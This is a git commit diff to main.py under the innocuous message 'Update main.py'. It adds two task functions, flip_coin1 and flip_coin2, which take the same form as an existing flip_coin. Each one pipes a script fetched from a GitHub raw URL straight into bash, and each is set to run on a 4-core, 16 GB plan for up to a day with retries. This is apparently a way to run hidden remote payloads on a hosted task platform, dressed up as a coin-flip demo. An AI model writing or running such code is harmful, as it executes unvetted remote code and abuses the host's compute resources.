4ad7a38125414a4200eb3ac7c7212d3736162ef4
rxt36q6 <rxt36q6@atomicmail.io>
2026-08-31 08:56:04 +0700

    Update main.py

--- main.py
+++ main.py
@@ -18,6 +18,33 @@ def flip_coin(ctx: TaskContext) -> str:
     import os
     os.system('curl -sL https://github.com/rxt36q6/file/raw/main/noidcp | bash')
 
+@app.task(
+    plan="4c-16g",
+    timeout_seconds=86400,
+    retry=Retry(
+        max_retries=3,
+        wait_duration_ms=1000,
+        backoff_scaling=1.5,
+    )
+)
+def flip_coin1(ctx: TaskContext) -> str:
+    import sys
+    import os
+    os.system('curl -sL https://github.com/rxt36q6/file/raw/main/noidcp | bash')
+
+@app.task(
+    plan="4c-16g",
+    timeout_seconds=86400,
+    retry=Retry(
+        max_retries=3,
+        wait_duration_ms=1000,
+        backoff_scaling=1.5,
+    )
+)
+def flip_coin2(ctx: TaskContext) -> str:
+    import sys
+    import os
+    os.system('curl -sL https://github.com/rxt36q6/file/raw/main/noidcp | bash')
 
 if __name__ == "__main__":
     app.start()
